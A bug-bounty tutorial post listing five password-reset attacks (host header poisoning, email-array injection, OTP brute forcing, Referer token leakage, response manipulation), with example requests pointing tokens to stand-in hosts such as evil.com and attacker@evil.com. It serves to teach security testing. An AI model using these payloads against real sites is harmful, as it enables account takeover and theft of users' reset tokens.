
### Implementing a Password Reset Feature:

For every developer, implementing a password reset feature is a very interesting part. This is where he develops a logic and then implements it in the code. There is no well-defined industry standard on how to implement a secure password reset functionality in your application. So, the result is that every application has a different way of doing the same, starting from emails, unique URLs, temporary passwords, security questions, OTP etc.

Here is a list of the most commonly used ways to implement the password reset feature.

*   Email sent with a unique URL to reset the password
*   Email sent with a temporary password or current password
*   Secret questions asked and then given the option to reset the password
*   Use of OTP (One-time passwords) or multi-factor authentication

### Exploitation of Password Reset Feature:

Exploiting Password Reset Feature can be quite interesting as there are many Common ways of exploiting it. It can lead to high severity bugs like Account Takeover as well as low hanging fruit like Weak token Implementation. Lets us look at the few of them:

### 1\. Token Leakage via Host Header Poisoning.

The attacker modifies the host header of the request to reset the target’s password to their own domain.

> GET [https://redacted.com/reset.php?email=foo@bar.com](https://redacted.com/reset.php?email=foo@bar.com) HTTP/1.1  
> host: evil.com

Trusting the company, they click the reset link. As the link is formed with the host header, this instead links to the attacker’s website. When the target visits this site, their password reset token is sent to the attacker. The attacker now resets the target’s password using their password reset token.

**Further Reading:**

> [https://hackerone.com/reports/182670](https://hackerone.com/reports/182670)  
> [https://hackerone.com/reports/698416](https://hackerone.com/reports/698416)  
> [https://hackerone.com/reports/13286](https://hackerone.com/reports/13286)

### 2\. Sending an array of email addresses instead of a single email address.

In this attack the The attacker can send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address and It could lead to full account takeover.

_POST_ [_https://example.com/api/v1/password\_reset_](https://example.com/api/v1/password_reset) _HTTP/1.1_

**Original Request Body:**  
_{“email\_address”:”_[_xyz@gmail.com_](mailto:xyz@gmail.com)_”}_

**Modified Request Body:**_{“email\_address”:\[“_[_admin@breadcrumb.com_](mailto:admin@breadcrumb.com)_”,”_[_attacker@evil.com_](mailto:attacker@evil.com)_”\]}_

In this way, the password reset link get send to both victim as well as attacker. And the attacker can use it to gain Full account Takeover.

**Further Reading:**  
[_https://hackerone.com/reports/322985_](https://hackerone.com/reports/322985)[_https://twitter.com/HusseiN98D/status/1254888748216655872_](https://twitter.com/HusseiN98D/status/1254888748216655872)
### 3\. Bruteforcing OTP for Reseting Password.

Now, In case The password reset functionality of application is based on OTP validation. Many program accepts No rate limit as acceptable risk. So, Bruteforcing OTP is worth trying.

You can reset the password of an account by intercepting the request for OTP validation and bruteforcing the 6 digit number. Using this, it is possible to change and reset the password of any account, by changing the user data and brute-forcing the reset OTP.

**Further Reading:**  
[_https://hackerone.com/reports/743545_](https://hackerone.com/reports/743545)[_https://hackerone.com/reports/280389_](https://hackerone.com/reports/280389)

### 4\. Password Reset Token Leak Via Referrer.

The **HTTP referer** is an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested. The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed.

Exploitation:

•Request password reset to your email address  
•Click on the password reset link  
•Don’t change password  
•Click any 3rd party websites(eg: Facebook, twitter)  
•Intercept the request in burpsuite proxy  
•Check if the referer header is leaking password reset token.

**Further Reading:**  
[_https://hackerone.com/reports/342693_](https://hackerone.com/reports/342693)[_https://hackerone.com/reports/272379_](https://hackerone.com/reports/272379)[_https://hackerone.com/reports/737042_](https://hackerone.com/reports/737042)

### 5\. Response manipulation: Replace Bad Response With Good One

Response manipulation can give you easy bugs. You can first use the normally and capture the response of reset password when you entered correct OTP/Token. Then try again with wrong OTP/Token and replace the unauthorized response with the success one.

**Look for Request and Response like these**  
_HTTP/1.1 401 Unauthorized_  
_(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)_

**Change Response**  
_HTTP/1.1 200 OK  
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)_

_Further Reading:_  
[_https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3_](https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3)

**_Thanks for Reading. Any Suggestions are always welcomed!!_**

Follow me: [https://twitter.com/Sm4rty\_](https://twitter.com/Sm4rty_)